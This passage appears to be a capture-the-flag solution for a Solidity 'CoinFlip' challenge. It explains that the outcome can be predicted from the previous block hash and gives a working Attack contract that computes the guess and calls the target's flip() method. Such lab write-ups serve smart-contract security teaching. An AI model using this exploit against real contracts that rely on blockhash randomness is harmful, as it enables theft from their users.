* Run this code. Get the guess value and call the `flip()` method. As the
  `block.number` is same inside `attack()` and `flip()` methods we can
  correctly guess the value. We can't use for loop to guess this ten times
  because the if condition inside will check if the last hash is same as the
  current one or not. So we need to run `attack()` method 10 times to create 10
  transactions.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}
contract Attack {
    using SafeMath for uint256;

    constructor() public{}

    function attack(address _coinFlip) public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 value = blockValue.div(FACTOR);
        bool guess = value == 1 ? true : false;
        bool result = ICoinFlip(_coinFlip).flip(guess);
        return result;
    }
}
```
